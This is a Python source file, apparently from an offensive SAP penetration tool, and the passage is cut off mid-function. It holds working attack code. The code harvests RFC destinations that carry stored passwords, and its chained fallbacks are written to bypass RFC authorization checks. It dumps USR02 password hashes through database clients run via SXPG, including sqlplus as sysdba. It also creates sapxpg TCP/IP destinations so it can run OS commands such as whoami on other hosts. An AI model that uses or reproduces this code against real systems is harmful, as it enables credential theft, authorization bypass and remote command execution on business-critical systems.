# Retrieve RFC connections (via RSRFCCHK)
# ---------------------------------------------------------------------------

def retrieve_rfc_connections(node: SAPNode, creds: Credentials = None) -> list:
    """Retrieve Type-3 RFC connections from a system by executing RSRFCCHK.

    Uses the XBP job scheduling approach from poc_remote_abap_exec.py.
    Returns list of RFCConn objects.
    """
    connections = []

    try:
        with _get_connection(node, creds) as conn:
            # Step 1: XMI Logon
            print(f"[*] Logging on to XBP interface on {node.sid}...")
            xmi_result = conn.call(
                "BAPI_XMI_LOGON",
                EXTCOMPANY="SAPMAP",
                EXTPRODUCT="SAPMAP",
                INTERFACE="XBP",
                VERSION="3.0",
            )
            ret = xmi_result.get("RETURN", {})
            if isinstance(ret, dict) and ret.get("TYPE", "") in ("E", "A"):
                print(f"[-] {node.sid}: XBP logon failed: {ret.get('MESSAGE', '')}")
                return _try_rfc_read_table_fallback(conn, node)

            # Step 2: Open job
            print(f"[*] Scheduling RSRFCCHK job on {node.sid}...")
            job_result = conn.call(
                "BAPI_XBP_JOB_OPEN",
                JOBNAME=RSRFCCHK_JOB_NAME,
                EXTERNAL_USER_NAME=RSRFCCHK_EXTERNAL_USER,
            )
            jobcount = job_result.get("JOBCOUNT", "")
            if not jobcount:
                print(f"[-] {node.sid}: Failed to open job: {job_result}")
                return _try_rfc_read_table_fallback(conn, node)

            # Step 3: Add ABAP step
            conn.call(
                "BAPI_XBP_JOB_ADD_ABAP_STEP",
                JOBNAME=RSRFCCHK_JOB_NAME,
                JOBCOUNT=jobcount,
                EXTERNAL_USER_NAME=RSRFCCHK_EXTERNAL_USER,
                ABAP_PROGRAM_NAME=RSRFCCHK_PROGRAM,
            )

            # Step 4: Close job
            conn.call(
                "BAPI_XBP_JOB_CLOSE",
                JOBNAME=RSRFCCHK_JOB_NAME,
                JOBCOUNT=jobcount,
                EXTERNAL_USER_NAME=RSRFCCHK_EXTERNAL_USER,
            )

            # Step 5: Start job
            conn.call(
                "BAPI_XBP_JOB_START_IMMEDIATELY",
                JOBNAME=RSRFCCHK_JOB_NAME,
                JOBCOUNT=jobcount,
                EXTERNAL_USER_NAME=RSRFCCHK_EXTERNAL_USER,
            )
            print(f"[*] {node.sid}: Job started, polling for completion...")

            # Step 6: Wait for completion
            finished = False
            for attempt in range(DEFAULT_MAX_POLL_ATTEMPTS):
                status_result = conn.call(
                    "BAPI_XBP_JOB_STATUS_GET",
                    JOBNAME=RSRFCCHK_JOB_NAME,
                    JOBCOUNT=jobcount,
                    EXTERNAL_USER_NAME=RSRFCCHK_EXTERNAL_USER,
                )
                status = status_result.get("STATUS", "?")
                if status == "F":
                    finished = True
                    break
                if status == "X":
                    print(f"[-] {node.sid}: Job aborted")
                    break
                time.sleep(DEFAULT_POLL_INTERVAL)

            if not finished:
                print(f"[-] {node.sid}: Job did not finish, trying table fallback...")
                return _try_rfc_read_table_fallback(conn, node)

            # Step 7: Read spool output
            print(f"[+] {node.sid}: Job finished, reading spool output...")
            try:
                spool_result = conn.call(
                    "BAPI_XBP_JOB_SPOOLLIST_READ",
                    JOBNAME=RSRFCCHK_JOB_NAME,
                    JOBCOUNT=jobcount,
                    STEP_NUMBER=1,
                    EXTERNAL_USER_NAME=RSRFCCHK_EXTERNAL_USER,
                )
                spool_lines = spool_result.get("SPOOL_LIST", [])
                if spool_lines:
                    connections = _parse_rsrfcchk_output(spool_lines, node)
                    print(f"[+] {node.sid}: Parsed {len(connections)} RFC connections from spool")
                else:
                    print(f"[*] {node.sid}: No spool output, trying table fallback...")
                    connections = _try_rfc_read_table_fallback(conn, node)
            except Exception as e:
                logger.debug(f"Spool read error: {e}")
                connections = _try_rfc_read_table_fallback(conn, node)

            # XMI Logoff
            try:
                conn.call("BAPI_XMI_LOGOFF", INTERFACE="XBP")
            except Exception:
                pass

            # If RSRFCCHK yielded nothing, fall back to RFCDES table
            if not connections:
                print(f"[*] {node.sid}: No connections from RSRFCCHK, trying RFCDES fallback...")
                connections = _try_rfc_read_table_fallback(conn, node)

    except Exception as e:
        logger.error(f"RFC connection retrieval failed for {node.sid}: {e}")
        print(f"[-] {node.sid}: Failed to retrieve RFC connections: {e}")
        # Last resort: try RFCDES in a fresh connection
        try:
            with _get_connection(node, creds) as conn:
                connections = _try_rfc_read_table_fallback(conn, node)
        except Exception as e2:
            logger.debug(f"RFCDES fallback also failed: {e2}")

    # 3rd fallback: bypass RFC_GET_FUNCTION_INTERFACE using call_raw
    if not connections:
        try:
            with _get_connection(node, creds) as conn:
                connections = _try_rfcdes_raw_fallback(conn, node)
        except Exception as e3:
            logger.debug(f"call_raw RFCDES fallback also failed: {e3}")

    # 4th fallback: GET_TABLEBLOCK_COMPRESSED_RFC (bypasses both
    # RFC_GET_FUNCTION_INTERFACE and RFC_READ_TABLE authorization)
    if not connections:
        try:
            with _get_connection(node, creds) as conn:
                connections = _try_tableblock_compressed_fallback(conn, node)
        except Exception as e4:
            logger.debug(f"GET_TABLEBLOCK_COMPRESSED_RFC fallback failed: {e4}")

    return connections


def _parse_rsrfcchk_output(spool_lines: list, node: SAPNode) -> list:
    """Parse RSRFCCHK spool output into RFCConn objects."""
    connections = []

    for line in spool_lines:
        text = line.get("LINE", "") or line.get("WA", "") or str(line)
        # RSRFCCHK output format varies but typically contains:
        # Destination name, host, instance, client, user, connection type
        # Parse heuristically
        text = text.strip()
        if not text or text.startswith("*") or text.startswith("-"):
            continue

        # Try to extract type-3 connection info
        # Format typically: DESTNAME | HOST | INST | CLIENT | USER | TYPE
        parts = [p.strip() for p in text.split("|")]
        if len(parts) >= 4:
            dest_name = parts[0] if len(parts) > 0 else ""
            target_host = parts[1] if len(parts) > 1 else ""
            inst_nr = parts[2] if len(parts) > 2 else ""
            rfc_user = parts[3] if len(parts) > 3 else ""
            client = parts[4] if len(parts) > 4 else ""

            if dest_name:
                conn = RFCConn(
                    source_sid=node.sid,
                    source_host=node.hostname or node.ip,
                    target_host=target_host,
                    target_instance_nr=inst_nr,
                    destination_name=dest_name,
                    rfc_user=rfc_user,
                    client=client,
                )
                connections.append(conn)

    return connections


def _try_rfc_read_table_fallback(conn, node: SAPNode) -> list:
    """Fallback: read RFCDES table directly for Type-3 connections with stored passwords."""
    print(f"[*] {node.sid}: Trying RFC_READ_TABLE fallback on RFCDES...")
    connections = []

    try:
        result = conn.call(
            RFC_READ_TABLE,
            QUERY_TABLE="RFCDES",
            DELIMITER="|",
            FIELDS=[
                {"FIELDNAME": "RFCDEST"},
                {"FIELDNAME": "RFCTYPE"},
                {"FIELDNAME": "RFCOPTIONS"},
            ],
            OPTIONS=[{"TEXT": "RFCTYPE = '3'"}],
            ROWCOUNT=500,
        )

        data = result.get("DATA", [])
        for row in data:
            wa = row.get("WA", "")
            parts = wa.split("|")
            if len(parts) >= 2:
                dest_name = parts[0].strip()
                options = parts[2].strip() if len(parts) > 2 else ""

                # Only include connections that have a stored password
                if "%_PWD" not in options:
                    continue

                conn_obj = RFCConn(
                    source_sid=node.sid,
                    source_host=node.hostname or node.ip,
                    destination_name=dest_name,
                )
                _parse_rfcdes_options(conn_obj, options)
                connections.append(conn_obj)

        print(f"[+] {node.sid}: Found {len(connections)} Type-3 connections "
              f"with stored passwords via RFCDES")

    except Exception as e:
        logger.debug(f"RFCDES read failed: {e}")
        print(f"[-] {node.sid}: Could not read RFCDES table: {e}")

    return connections


def _try_rfcdes_raw_fallback(conn, node: SAPNode) -> list:
    """Fallback: read RFCDES via call_raw, bypassing RFC_GET_FUNCTION_INTERFACE.

    This helps when the user lacks S_RFC authorization for function group SRFC
    (RFC_GET_FUNCTION_INTERFACE) but does have authorization for SDTX
    (RFC_READ_TABLE).  The normal conn.call() always invokes
    RFC_GET_FUNCTION_INTERFACE first to fetch parameter metadata; call_raw
    skips that by supplying a hand-built function description.
    """
    print(f"[*] {node.sid}: Trying RFC_READ_TABLE via call_raw (bypass RFC_GET_FUNCTION_INTERFACE)...")
    connections = []

    try:
        # Build type descriptors for RFC_READ_TABLE's table parameters
        fields_td = conn._make_type_desc('RFC_DB_FLD', [
            ('FIELDNAME', RFCTYPE_CHAR, 30, 60),
            ('FIELDTEXT', RFCTYPE_CHAR, 60, 120),
            ('TYPE',      RFCTYPE_CHAR, 1,  2),
            ('LENGTH',    RFCTYPE_CHAR, 6,  12),
            ('OFFSET',    RFCTYPE_CHAR, 6,  12),
        ])
        options_td = conn._make_type_desc('RFC_DB_OPT', [
            ('TEXT', RFCTYPE_CHAR, 72, 144),
        ])
        data_td = conn._make_type_desc('TAB512', [
            ('WA', RFCTYPE_CHAR, 512, 1024),
        ])

        func_desc = conn._make_func_desc('RFC_READ_TABLE', [
            ('QUERY_TABLE', RFC_IMPORT, RFCTYPE_CHAR,  60,   30,  None),
            ('DELIMITER',   RFC_IMPORT, RFCTYPE_CHAR,  2,    1,   None),
            ('ROWCOUNT',    RFC_IMPORT, RFCTYPE_INT,   4,    4,   None),
            ('FIELDS',      RFC_TABLES, RFCTYPE_TABLE, 206,  103, fields_td),
            ('OPTIONS',     RFC_TABLES, RFCTYPE_TABLE, 144,  72,  options_td),
            ('DATA',        RFC_TABLES, RFCTYPE_TABLE, 1024, 512, data_td),
        ])

        result = conn.call_raw(
            'RFC_READ_TABLE', func_desc,
            QUERY_TABLE='RFCDES',
            DELIMITER='|',
            FIELDS=[
                {'FIELDNAME': 'RFCDEST'},
                {'FIELDNAME': 'RFCTYPE'},
                {'FIELDNAME': 'RFCOPTIONS'},
            ],
            OPTIONS=[{'TEXT': "RFCTYPE = '3'"}],
            ROWCOUNT=500,
        )

        data = result.get("DATA", [])
        for row in data:
            wa = row.get("WA", "")
            parts = wa.split("|")
            if len(parts) >= 2:
                dest_name = parts[0].strip()
                options = parts[2].strip() if len(parts) > 2 else ""
                if "%_PWD" not in options:
                    continue
                conn_obj = RFCConn(
                    source_sid=node.sid,
                    source_host=node.hostname or node.ip,
                    destination_name=dest_name,
                )
                _parse_rfcdes_options(conn_obj, options)
                connections.append(conn_obj)

        print(f"[+] {node.sid}: Found {len(connections)} Type-3 connections "
              f"with stored passwords via call_raw RFCDES")

    except Exception as e:
        logger.debug(f"call_raw RFCDES failed: {e}")
        print(f"[-] {node.sid}: call_raw RFCDES fallback failed: {e}")

    return connections


def _try_tableblock_compressed_fallback(conn, node: SAPNode) -> list:
    """Fallback: read RFCDES via GET_TABLEBLOCK_COMPRESSED_RFC + SAP decompressor.

    This bypasses both RFC_GET_FUNCTION_INTERFACE and RFC_READ_TABLE
    authorization.  GET_TABLEBLOCK_COMPRESSED_RFC is often authorized
    for users with basic RFC access because it is used internally by
    SAP's own table comparison and distribution tools.

    The data comes back in SAP's proprietary LZH-compressed format
    inside BOX4096 table rows.  We decompress it with a small C helper
    built from the MaxDB/pysap GPL decompression library.
    """
    import os, subprocess, struct

    print(f"[*] {node.sid}: Trying GET_TABLEBLOCK_COMPRESSED_RFC on RFCDES ...")
    connections = []

    decompress_bin = os.path.join(os.path.dirname(__file__), "sap_decompress")
    if not os.path.isfile(decompress_bin):
        print(f"[-] {node.sid}: sap_decompress binary not found, skipping")
        return connections

    try:
        # -- build type / function descriptors -------------------------
        tbl256_td = conn._make_type_desc('TBL256', [
            ('LINE', RFCTYPE_BYTE, 256, 256),
        ])
        ntab_td = conn._make_type_desc('NTAB_CMP', [
            ('VIEWNAME',  RFCTYPE_CHAR, 30, 60),
            ('VARIANT',   RFCTYPE_CHAR, 14, 28),
            ('FIELDNAME', RFCTYPE_CHAR, 30, 60),
            ('TXTFIELD',  RFCTYPE_CHAR, 1,  2),
            ('FOFFSET',   RFCTYPE_NUM,  6,  12),
            ('INTLEN',    RFCTYPE_NUM,  6,  12),
            ('DECIMALS',  RFCTYPE_NUM,  6,  12),
            ('SIGN',      RFCTYPE_CHAR, 1,  2),
            ('INTTYPE',   RFCTYPE_CHAR, 1,  2),
            ('DATATYPE',  RFCTYPE_CHAR, 4,  8),
            ('DOMNAME',   RFCTYPE_CHAR, 30, 60),
            ('ROLLNAME',  RFCTYPE_CHAR, 30, 60),
            ('KEYFLAG',   RFCTYPE_CHAR, 1,  2),
            ('PRTFRKYFLD',RFCTYPE_CHAR, 1,  2),
            ('CLI_FIELD', RFCTYPE_CHAR, 1,  2),
            ('CHECKTABLE',RFCTYPE_CHAR, 30, 60),
            ('REFTABLE',  RFCTYPE_CHAR, 30, 60),
            ('REFFIELD',  RFCTYPE_CHAR, 30, 60),
            ('READONLY',  RFCTYPE_CHAR, 1,  2),
            ('FLAG',      RFCTYPE_CHAR, 1,  2),
            ('LANGU',     RFCTYPE_CHAR, 1,  2),
            ('OUTPUTLEN', RFCTYPE_NUM,  6,  12),
            ('CONVEXIT',  RFCTYPE_CHAR, 5,  10),
            ('FIELDTEXT', RFCTYPE_CHAR, 60, 120),
            ('REPTEXT',   RFCTYPE_CHAR, 55, 110),
            ('SCRTEXT_S', RFCTYPE_CHAR, 10, 20),
            ('SCRTEXT_M', RFCTYPE_CHAR, 20, 40),
            ('SCRTEXT_L', RFCTYPE_CHAR, 40, 80),
            ('TEXT',      RFCTYPE_CHAR, 55, 110),
            ('WIDTH',     RFCTYPE_NUM,  6,  12),
            ('WIDTH_CUST',RFCTYPE_NUM,  6,  12),
            ('NT_INDEX',  RFCTYPE_INT,  4,  4),
            ('CMP_FLAG',  RFCTYPE_CHAR, 2,  4),
            ('COMPARE',   RFCTYPE_CHAR, 1,  2),
            ('ADJUST',    RFCTYPE_CHAR, 1,  2),
            ('VISIBLE',   RFCTYPE_CHAR, 1,  2),
            ('FIELD_POS', RFCTYPE_NUM,  4,  8),
        ])
        ntab_nuc = (30+14+30+1+6+6+6+1+1+4+30+30+1+1+1+30+30+30
                    +1+1+1+6+5+60+55+10+20+40+55+6+6+4+2+1+1+1+4)
        ntab_uc  = (60+28+60+2+12+12+12+2+2+8+60+60+2+2+2+60+60+60
                    +2+2+2+12+10+120+110+20+40+80+110+12+12+4+4+2+2+2+8)

        func_desc = conn._make_func_desc('GET_TABLEBLOCK_COMPRESSED_RFC', [
            ('TABNAME',      RFC_IMPORT, RFCTYPE_CHAR,  60,      30,       None),
            ('GET_SYSTAB',   RFC_IMPORT, RFCTYPE_CHAR,  2,       1,        None),
            ('FIRST_KEY',    RFC_IMPORT, RFCTYPE_CHAR,  2,       1,        None),
            ('BLOCK_SIZE',   RFC_IMPORT, RFCTYPE_INT,   4,       4,        None),
            ('BOX4096',      RFC_TABLES, RFCTYPE_TABLE, 256,     256,      tbl256_td),
            ('NAME_TAB',     RFC_TABLES, RFCTYPE_TABLE, ntab_uc, ntab_nuc, ntab_td),
            ('NR_OF_ROWS',   RFC_EXPORT, RFCTYPE_INT,   4,       4,        None),
            ('TABLEN',       RFC_EXPORT, RFCTYPE_INT,   4,       4,        None),
            ('CHARLEN',      RFC_EXPORT, RFCTYPE_INT,   4,       4,        None),
            ('READY_FLAG',   RFC_EXPORT, RFCTYPE_CHAR,  2,       1,        None),
            ('CODE_PAGE',    RFC_EXPORT, RFCTYPE_NUM,   8,       4,        None),
            ('CHECK_NUMBER', RFC_EXPORT, RFCTYPE_NUM,   8,       4,        None),
            ('STRINGS',      RFC_EXPORT, RFCTYPE_CHAR,  2,       1,        None),
        ])

        # -- call the FM -----------------------------------------------
        result = conn.call_raw(
            'GET_TABLEBLOCK_COMPRESSED_RFC', func_desc,
            TABNAME='RFCDES', GET_SYSTAB='X', FIRST_KEY='X',
            BLOCK_SIZE=100000,
        )

        nr_rows = result.get('NR_OF_ROWS', 0)
        if nr_rows == 0:
            print(f"[*] {node.sid}: RFCDES returned 0 rows")
            return connections

        # -- reassemble & decompress -----------------------------------
        box = result.get('BOX4096', [])
        raw = b''.join(
            row.get('LINE', b'') for row in box
            if isinstance(row.get('LINE'), bytes)
        )
        # First 8 bytes are a transport pre-header; SAP compression
        # header starts at offset 8.
        sap_compressed = raw[8:]

        proc = subprocess.run(
            [decompress_bin], input=sap_compressed,
            capture_output=True, timeout=30,
        )
        if proc.returncode != 0 or not proc.stdout:
            err = proc.stderr.decode(errors='replace').strip()
            print(f"[-] {node.sid}: SAP decompression failed: {err}")
            return connections

        decompressed = proc.stdout
        row_size = len(decompressed) // nr_rows if nr_rows else 0
        if row_size == 0:
            return connections

        # -- parse rows in UC (UTF-16-LE) format -----------------------
        # RFCDEST   offset 0    len 64  (CHAR 32)
        # RFCTYPE   offset 64   len 2   (CHAR 1)
        # RFCOPTIONS offset 66  len 500 (CHAR 250)
        for r in range(nr_rows):
            rd = decompressed[r * row_size : (r + 1) * row_size]
            if len(rd) < 566:
                continue
            rfcdest = rd[0:64].decode('utf-16-le', errors='replace'
                                      ).rstrip('\x00').strip()
            rfctype = rd[64:66].decode('utf-16-le', errors='replace'
                                       ).rstrip('\x00').strip()
            rfcoptions = rd[66:566].decode('utf-16-le', errors='replace'
                                           ).rstrip('\x00').strip()
            if not rfcdest or rfctype != '3':
                continue
            if '%_PWD' not in rfcoptions:
                continue

            conn_obj = RFCConn(
                source_sid=node.sid,
                source_host=node.hostname or node.ip,
                destination_name=rfcdest,
            )
            _parse_rfcdes_options(conn_obj, rfcoptions)
            connections.append(conn_obj)

        print(f"[+] {node.sid}: Found {len(connections)} Type-3 connections "
              f"with stored passwords via GET_TABLEBLOCK_COMPRESSED_RFC")

    except Exception as e:
        logger.debug(f"GET_TABLEBLOCK_COMPRESSED_RFC failed: {e}")
        print(f"[-] {node.sid}: GET_TABLEBLOCK_COMPRESSED_RFC fallback failed: {e}")

    return connections


def _parse_rfcdes_options(conn: RFCConn, options_str: str):
    """Parse RFCDES RFCOPTIONS field to extract host, instance, user, client."""
    for part in options_str.split(","):
        part = part.strip()
        if part.startswith("H="):
            conn.target_host = part[2:].strip()
        elif part.startswith("S="):
            conn.target_instance_nr = part[2:].strip()
        elif part.startswith("U="):
            conn.rfc_user = part[2:].strip()
        elif part.startswith("M="):
            conn.client = part[2:].strip()


# ---------------------------------------------------------------------------
# Read table data
# ---------------------------------------------------------------------------

def read_table(node: SAPNode, table_name: str, fields: list = None,
               where: str = "", max_rows: int = 500,
               creds: Credentials = None) -> list:
    """Read data from an SAP table via RFC_READ_TABLE.

    Args:
        table_name: SAP table name (e.g., "USR02", "T000")
        fields: list of field names to retrieve
        where: WHERE clause (e.g., "BNAME = 'DDIC'")
        max_rows: maximum rows to return

    Returns:
        list of dicts with field values
    """
    rows = []

    try:
        with _get_connection(node, creds) as conn:
            params = {
                "QUERY_TABLE": table_name,
                "DELIMITER": "|",
                "ROWCOUNT": max_rows,
            }
            if fields:
                params["FIELDS"] = [{"FIELDNAME": f} for f in fields]
            if where:
                # Split WHERE into 72-char chunks (SAP table parameter limit)
                options = []
                while where:
                    chunk = where[:72]
                    options.append({"TEXT": chunk})
                    where = where[72:]
                params["OPTIONS"] = options

            result = conn.call(RFC_READ_TABLE, **params)

            # Parse field metadata
            field_meta = result.get("FIELDS", [])
            field_names = [f.get("FIELDNAME", "").strip() for f in field_meta]
            field_offsets = [(int(f.get("OFFSET", 0)), int(f.get("LENGTH", 0)))
                            for f in field_meta]

            # Parse data rows
            data = result.get("DATA", [])
            for row in data:
                wa = row.get("WA", "")
                parts = wa.split("|")
                row_dict = {}
                for i, fname in enumerate(field_names):
                    if i < len(parts):
                        row_dict[fname] = parts[i].strip()
                    else:
                        row_dict[fname] = ""
                rows.append(row_dict)

    except Exception as e:
        logger.error(f"Table read failed for {table_name}@{node.sid}: {e}")
        print(f"[-] {node.sid}: Could not read {table_name}: {e}")

    return rows


# ---------------------------------------------------------------------------
# Download password hashes
# ---------------------------------------------------------------------------

def download_password_hashes(node: SAPNode,
                             creds: Credentials = None) -> list:
    """Download password hashes from USR02 table.

    Tries two methods in order:
      1. SXPG database CLI (hdbsql/sqlcli/sqlcmd/sqlplus) — returns FULL hashes
         with BINTOHEX/RAWTOHEX encoding (no truncation)
      2. RFC_READ_TABLE — returns HALF hashes (RAW fields truncated to ~8 hex
         chars due to CHAR conversion)

    Returns list of dicts with fields: MANDT, BNAME, BCODE, PASSCODE,
    PWDSALTEDHASH, CODVN, USTYP, UFLAG, hash_quality ("full" or "half").

    PWDSALTEDHASH is always full (VARCHAR, no truncation issue).
    """
    print(f"[*] {node.sid}: Downloading password hashes...")

    # --- Method 1: Direct DB query via SXPG (full hashes) ---
    rows = _download_hashes_via_sxpg(node, creds)
    if rows:
        print(f"[+] {node.sid}: Downloaded {len(rows)} FULL password hashes "
              f"via database CLI")
        return rows

    # --- Method 2: RFC_READ_TABLE (half hashes for BCODE/PASSCODE) ---
    print(f"[*] {node.sid}: Falling back to RFC_READ_TABLE (half hashes)...")
    fields = ["MANDT", "BNAME", "BCODE", "PASSCODE", "PWDSALTEDHASH",
              "CODVN", "USTYP", "UFLAG"]
    rows = read_table(node, "USR02", fields=fields, creds=creds, max_rows=9999)
    if rows:
        for r in rows:
            r["hash_quality"] = "half"
        print(f"[+] {node.sid}: Downloaded {len(rows)} password hashes "
              f"(half hashes — BCODE/PASSCODE may be truncated)")
    else:
        print(f"[-] {node.sid}: No password hashes retrieved")
    return rows


def _download_hashes_via_sxpg(node: SAPNode,
                               creds: Credentials = None) -> list | None:
    """Download FULL password hashes via direct DB query through SXPG.

    Uses execute_local_command() to run the database CLI and query USR02
    with BINTOHEX/RAWTOHEX to get un-truncated binary hash fields.

    The SXPG LOG MESSAGE field truncates at ~128 chars per line, so we
    run separate queries for each field and merge by row index.

    Returns list of dicts, or None if SXPG/DB query is not available.
    """
    db_type = (node.db_type or "").upper()
    if not db_type:
        return None

    chunk = 120  # max hex chars per SXPG output line

    if db_type in ("HDB", "HANA"):
        tbl = "USR02"
        hex_fn_bcode = "BINTOHEX(BCODE)"
        hex_fn_passcode = "BINTOHEX(PASSCODE)"
        sub_fn = "SUBSTR"
        def run_q(sql):
            return execute_local_command(node, "hdbsql",
                                         f"-U DEFAULT -x {sql}", creds)
    elif db_type in ("ADA", "MAXDB", "ADABAS"):
        tbl = "USR02"
        hex_fn_bcode = "RAWTOHEX(BCODE)"
        hex_fn_passcode = "RAWTOHEX(PASSCODE)"
        sub_fn = "SUBSTR"
        def run_q(sql):
            return execute_local_command(node, "sqlcli",
                                         f"-U DEFAULT {sql}", creds)
    elif db_type == "MSS":
        sid = node.sid
        tbl = f"[{sid}].[{sid}].[USR02]"
        hex_fn_bcode = "CONVERT(VARCHAR(100),BCODE,2)"
        hex_fn_passcode = "CONVERT(VARCHAR(100),PASSCODE,2)"
        sub_fn = "SUBSTRING"
        def run_q(sql):
            return execute_local_command(node, "sqlcmd",
                                         f"-S localhost -h -1 -W -Q {sql}", creds)
    elif db_type in ("ORA", "ORACLE"):
        tbl = "SAPSR3.USR02"
        hex_fn_bcode = "RAWTOHEX(BCODE)"
        hex_fn_passcode = "RAWTOHEX(PASSCODE)"
        sub_fn = "SUBSTR"
        def run_q(sql):
            return execute_local_command(node, "sqlplus",
                                         f"-S / as sysdba @/dev/stdin <<< {sql}", creds)
    else:
        return None

    print(f"[*] {node.sid}: Querying USR02 via SXPG ({db_type} CLI) "
          f"for full hashes...")

    # Query 1: MANDT, BNAME, CODVN, USTYP, UFLAG, PWDSALTEDHASH (all CHAR fields)
    r_meta = run_q(
        f"SELECT MANDT||'~~~'||BNAME||'~~~'||CODVN||'~~~'||USTYP"
        f"||'~~~'||UFLAG||'~~~'||PWDSALTEDHASH FROM {tbl}")

    if not r_meta.get("success"):
        print(f"[-] {node.sid}: SXPG USR02 meta query failed: "
              f"{r_meta.get('error', '')}")
        return None

    # Query 2: BCODE hex (may need 2 chunks for 80 hex chars)
    r_bcode = run_q(f"SELECT {hex_fn_bcode} FROM {tbl}")

    # Query 3: PASSCODE hex
    r_passcode = run_q(f"SELECT {hex_fn_passcode} FROM {tbl}")

    # Parse output lines
    def _clean(result):
        lines = []
        for line in result.get("output", []):
            clean = line.strip().strip('"').strip("'")
            if clean.startswith("|") and clean.endswith("|"):
                clean = clean[1:-1].strip()
            elif clean.startswith("|"):
                clean = clean[1:].strip()
            if not clean or clean.startswith("---") or clean.startswith("==="):
                continue
            up = clean.upper()
            if up.startswith(("MANDT", "BINTOHEX", "RAWTOHEX", "CONVERT",
                              "SUBSTR", "EXPRESSION", "BCODE", "PASSCODE")):
                continue
            if clean.startswith("*") or "rows selected" in clean.lower():
                continue
            lines.append(clean)
        return lines

    meta_lines = _clean(r_meta)
    bcode_lines = _clean(r_bcode) if r_bcode.get("success") else []
    passcode_lines = _clean(r_passcode) if r_passcode.get("success") else []

    if not meta_lines:
        print(f"[-] {node.sid}: SXPG USR02 query returned no data")
        return None

    rows = []
    for i, meta in enumerate(meta_lines):
        parts = meta.split("~~~")
        if len(parts) < 5:
            continue
        row = {
            "MANDT": parts[0].strip(),
            "BNAME": parts[1].strip(),
            "CODVN": parts[2].strip(),
            "USTYP": parts[3].strip(),
            "UFLAG": parts[4].strip(),
            "PWDSALTEDHASH": parts[5].strip() if len(parts) > 5 else "",
            "BCODE": bcode_lines[i].strip().upper() if i < len(bcode_lines) else "",
            "PASSCODE": passcode_lines[i].strip().upper() if i < len(passcode_lines) else "",
            "hash_quality": "full",
        }
        rows.append(row)

    return rows if rows else None


# ---------------------------------------------------------------------------
# Client role detection
# ---------------------------------------------------------------------------

def get_client_roles(node: SAPNode, creds: Credentials = None) -> list:
    """Read T000 table to get client categories (P=Production, etc.).

    Returns list of dicts: {MANDT, CCCATEGORY, CCCORACTIV, MTEXT}
    """
    # Try CNV_MBT_SHELL_GET_CLIENTS first (S/4 systems)
    clients = []
    try:
        with _get_connection(node, creds) as conn:
            try:
                result = conn.call(CNV_MBT_SHELL_GET_CLIENTS)
                client_list = result.get("ET_CLIENTS", [])
                for c in client_list:
                    clients.append({
                        "MANDT": c.get("MANDT", "") or c.get("CLIENT", ""),
                        "CCCATEGORY": c.get("CCCATEGORY", ""),
                    })
                if clients:
                    return clients
            except Exception:
                pass  # Fall through to RFC_READ_TABLE

            # Fallback: RFC_READ_TABLE on T000
            result = conn.call(
                RFC_READ_TABLE,
                QUERY_TABLE="T000",
                DELIMITER="|",
                FIELDS=[
                    {"FIELDNAME": "MANDT"},
                    {"FIELDNAME": "CCCATEGORY"},
                    {"FIELDNAME": "CCCORACTIV"},
                    {"FIELDNAME": "MTEXT"},
                ],
            )
            data = result.get("DATA", [])
            for row in data:
                parts = row.get("WA", "").split("|")
                if len(parts) >= 2:
                    clients.append({
                        "MANDT": parts[0].strip(),
                        "CCCATEGORY": parts[1].strip(),
                        "CCCORACTIV": parts[2].strip() if len(parts) > 2 else "",
                        "MTEXT": parts[3].strip() if len(parts) > 3 else "",
                    })

    except Exception as e:
        logger.debug(f"Client role read failed for {node.sid}: {e}")
        print(f"[-] {node.sid}: Could not read client roles: {e}")

    return clients


def update_node_production_status(node: SAPNode, creds: Credentials = None):
    """Check client roles and update node's production status + clients list."""
    client_roles = get_client_roles(node, creds)
    if client_roles:
        node.clients = [
            {"nr": c["MANDT"], "category": c.get("CCCATEGORY", "")}
            for c in client_roles
        ]
        node.is_production = any(
            c.get("CCCATEGORY", "").upper() == "P" for c in client_roles
        )
        if node.is_production:
            print(f"[!] {node.sid} has PRODUCTION client(s)")
        else:
            print(f"[*] {node.sid} has no production clients")


# ---------------------------------------------------------------------------
# TCP/IP destination creation (sapxpg remote test)
# ---------------------------------------------------------------------------

def create_tcpip_destination(node: SAPNode, target_host: str,
                             target_sid: str = "",
                             target_gw_port: str = "",
                             creds: Credentials = None) -> dict:
    """Create a TCP/IP destination for remote sapxpg execution.

    Args:
        node: source SAP system to create the destination on
        target_host: IP/hostname of the target system
        target_sid: SID of the target (used in dest name)
        target_gw_port: gateway port of the target (e.g. "3300")
        creds: credentials to use on the source system

    Returns dict with: success, message, dest_name
    """
    ts = datetime.now().strftime("%Y%m%d%H%M%S")
    dest_name = f"SAPMAP_{target_sid}_{ts}" if target_sid else f"SAPMAP_{target_host[:14]}_{ts}"
    gw_service = target_gw_port or "3300"

    result = {"success": False, "message": "", "dest_name": dest_name}

    try:
        with _get_connection(node, creds) as conn:
            create_result = conn.call(
                DEST_RFC_TCPIP_CREATE,
                NAME=dest_name,
                DESCRIPTION=f"TCP/IP CONNECTION TO {target_sid or target_host}",
                SERVER_NAME=target_host,
                GATEWAY_HOST=target_host,
                GATEWAY_SERVICE=gw_service,
                METHOD="E",
                PROGRAM="sapxpg",
                CPIC_TIMEOUT="20",
            )
            # Check result
            ret = create_result.get("RETURN", {})
            if isinstance(ret, dict) and ret.get("TYPE", "") in ("E", "A"):
                result["message"] = ret.get("MESSAGE", "Unknown error")
            else:
                result["success"] = True
                result["message"] = f"TCP/IP destination {dest_name} created"
                print(f"[+] {node.sid}: Created TCP/IP dest {dest_name} → "
                      f"{target_host} (gw={gw_service})")
    except Exception as e:
        result["message"] = str(e)
        print(f"[-] {node.sid}: TCP/IP dest creation error: {e}")
        logger.debug(f"TCP/IP dest creation failed: {e}")

    return result


# ---------------------------------------------------------------------------
# Remote OS command execution via SXPG_STEP_XPG_START
# ---------------------------------------------------------------------------

def execute_remote_command(node: SAPNode, destination: str,
                           command: str, params: str,
                           creds: Credentials = None) -> dict:
    """Execute an OS command on a remote system via SXPG_STEP_XPG_START.

    Uses an existing TCP/IP destination (sapxpg) to run a command on the
    target system.  The source system calls SXPG_STEP_XPG_START which
    forwards the execution request over the TCP/IP destination.

    Args:
        node: source SAP system (where we have credentials)
        destination: TCP/IP destination name (e.g. SAPMAP_W74_20260305165740)
        command: executable to run (e.g. cmd.exe or /bin/sh)
        params: command parameters (e.g. /C whoami or -c whoami)
        creds: credentials on the source system

    Returns dict with: success, output (list of lines), error
    """
    result = {"success": False, "output": [], "error": ""}

    try:
        with _get_connection(node, creds) as conn:
            call_result = conn.call(
                "SXPG_STEP_XPG_START",
                TARGET="",
